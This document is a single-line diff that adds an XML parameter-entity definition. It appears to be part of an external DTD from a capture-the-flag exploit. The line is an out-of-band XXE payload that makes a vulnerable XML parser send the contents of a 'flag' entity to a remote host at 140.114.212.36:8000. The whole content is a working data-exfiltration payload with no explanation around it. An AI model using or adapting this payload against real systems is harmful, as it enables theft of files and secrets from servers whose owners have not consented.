@@ -1,0 +1,1 @@
+<!ENTITY % a "<!ENTITY &#37; send SYSTEM 'http://140.114.212.36:8000?a=%flag;'>">
